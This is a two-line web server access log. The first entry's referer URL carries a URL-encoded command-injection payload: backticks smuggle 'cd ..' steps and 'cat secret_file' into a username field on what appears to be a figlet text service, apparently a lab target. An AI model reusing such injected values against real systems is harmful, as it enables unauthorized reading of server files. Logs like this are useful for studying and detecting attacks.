171.253.1.35 - - [28/Aug/2022:07:59:59 +0000] "GET /index.php?username=`&type=figlet HTTP/1.1" 200 1121 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:08:00:01 +0000] "-" 408 0 "-" "-"
